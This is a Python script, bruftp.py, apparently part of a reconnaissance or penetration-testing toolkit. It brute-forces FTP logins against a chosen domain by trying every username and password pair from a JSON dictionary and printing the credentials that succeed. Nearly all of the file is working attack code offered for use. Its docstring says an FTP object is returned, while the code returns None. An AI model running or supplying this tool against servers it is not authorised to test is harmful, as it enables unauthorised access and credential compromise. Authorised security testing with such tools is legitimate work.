#!/usr/bin/env python3
"""
This module makes use of dictionaries, possibly created in our User Reconnaissance module,
in order to bruteforce an FTP connection to a target machine that runs an ftp server. It
returns an FTP (ftplib) object in case of a successful connection.

File name: bruftp.py
Author: Konstantinos Christos Liosis
Date created: 20/6/2018
Python Version: 3.6.0

Example execution:
$ python bruftp.py -domain ftp.target.com
"""
import socket
import json
import configparser
import argparse
from ftplib import FTP

params = configparser.ConfigParser()
params.read('params.ini')


def ftpconnect(username, password, ftp_domain, verbose=False):
    """
    ftp connection function
    """
    if verbose:
        print(("Testing [User]: " + username + " [Password]: " + password))

    ftp = FTP()
    ftp.connect(host=ftp_domain, port=21)
    try:
        ftp.login(user=username, passwd=password)

    except Exception as e:
        if verbose:
            print(e)

        ftp = None

    return ftp


def bruteforce(users_dict, domain):
    user_pass_list = [];
    for user in users_dict:
        for password in users_dict[user]:
            attempt = ftpconnect(user, password, domain)
            if attempt:
                print(("Found user : pass -->" + user + " : " + password))
                # connection successful, return FTP object
                info = {
                    "Username": user,
                    "Password": password,
                }
                user_pass_list.append(info)
    print(user_pass_list)
    return None




def main():
    parser = argparse.ArgumentParser()

    # ftp domain
    parser.add_argument('-domain', help='Server')

    args = parser.parse_args()

    domain = args.domain

    if not domain:
        print('You must define an FTP domain')
        domain = input('Domain: ')

    if params['FTP']['users_pass'] == '':
        print('You must define user/pass JSON file')
        filename = input('Filename: ')

    else:
        filename = params['FTP']['users_pass']

    users_dict = json.load(open(filename, 'r'))

    return bruteforce(users_dict, domain)


if __name__ == "__main__":
    main()
